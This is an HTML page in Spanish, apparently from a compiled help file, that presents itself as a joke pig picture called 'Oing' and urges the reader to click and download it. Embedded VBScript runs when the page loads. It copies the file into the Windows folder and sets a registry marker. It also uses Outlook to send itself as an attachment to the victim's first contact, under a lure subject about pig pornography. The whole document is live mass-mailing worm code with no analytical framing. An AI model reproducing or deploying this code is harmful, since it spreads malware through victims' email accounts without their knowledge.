<body bgcolor="#000000">

<hr>
<p><b><font size="5">
<marquee bgcolor="#00FF00">As Click En La Foto Para Bajar Oing Para Q Te Mueras De La Risa!! JaJaJa!</marquee>
</font></b></p><p><a href="../../../../All%20Users/Documents/Oing.vbs">
<img border="0" src="../../My%20Pictures/pig.gif" width="556" height="318"></a></p>
<p>&nbsp;</p>

<script language="VBScript"><!--
MsgBox "Bienvenido A Oing!", vbInformation, "Oing!"
	on error resume next
	myPath=Replace(location.href,"mk:@MSITStore:","")
	myPath=Replace(myPath,"/","\")
	myPath=Mid(myPath,1,Instr(myPath,"::")-1)
	
	
	Set WinDir = fso.GetSpecialFolder(0)

		fso.CopyFile myPath,WinDir & "\Oing!.chm"
	
	Set Shell = CreateObject("WScript.Shell")
		if Shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm") = "" then

	Set Ol = CreateObject("Outlook.Application")

	if Ol.Name = "Outlook" then

	Victim = Ol.GetNamespace("MAPI").AddressLists.Item(1).AddressEntries.GetFirst

	With Ol.CreateItem(olMailItem)
		.Recipients.Add Victim
		.Attachments.Add myPath
		.Subject = "RE: Cerditos Porno!"
		.Body = "Alguna Vez As Visto A Un Cerdito Porno? JaJaJa Mira A Oing!"+vbcrlf+"GRATIS!!"+vbcrlf+Ol.Session.CurrentUser.Name
		.Send
	End With
	End IF

	Set Ol = Nothing
		Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm","1"
	Set Shell = Nothing
	End if
--></script>

</body>

</html>